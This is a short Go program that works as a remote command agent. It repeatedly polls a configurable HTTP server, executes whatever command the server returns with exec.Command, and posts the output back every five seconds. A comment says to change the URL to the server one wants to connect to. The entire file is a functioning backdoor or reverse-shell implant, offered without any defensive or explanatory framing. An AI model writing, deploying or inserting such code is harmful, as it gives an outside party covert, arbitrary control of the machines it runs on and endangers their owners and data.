package main
import (
    "io"
    "net/http"
    //"net/url"
    "os/exec"
    "strings"
    "time"
)
func runCommand(command string, args ...string) (string, error) {
    cmd := exec.Command(command, args...)
    // Capture the output.
    output, err := cmd.CombinedOutput()
    if err != nil {
        return "", nil
    }
    return string(output), nil
}
func main() {
    baseURL := "http://localhost:8000" // Change URL to server you want to connect to.
    data := ""
    for {
        // Build the URL with the "data" parameter.
        //reqURL := baseURL + "/?data=" + url.QueryEscape(data)
        // Make a GET request to the server with the "data" parameter.
		resp, err := http.Post(baseURL, "text/plain", strings.NewReader(data))
        //resp, err := http.Get(reqURL)
        if err != nil {
             continue
        }
        defer resp.Body.Close()
        // Read the response body.
        body, err := io.ReadAll(resp.Body)
        if err != nil {
            continue
        }
        // Split the body string into two variables.
        splitValues := strings.Fields(string(body))
        var command string
        var args []string
        if len(splitValues) > 0 {
            command = splitValues[0]
            if len(splitValues) > 1 {
                args = splitValues[1:]
            }
        }
        // Run the command.
        data, err = runCommand(command, args...)
        if err != nil {
            continue
        }
        // Wait for 5 seconds before making the next request.
        time.Sleep(5 * time.Second)
    }
}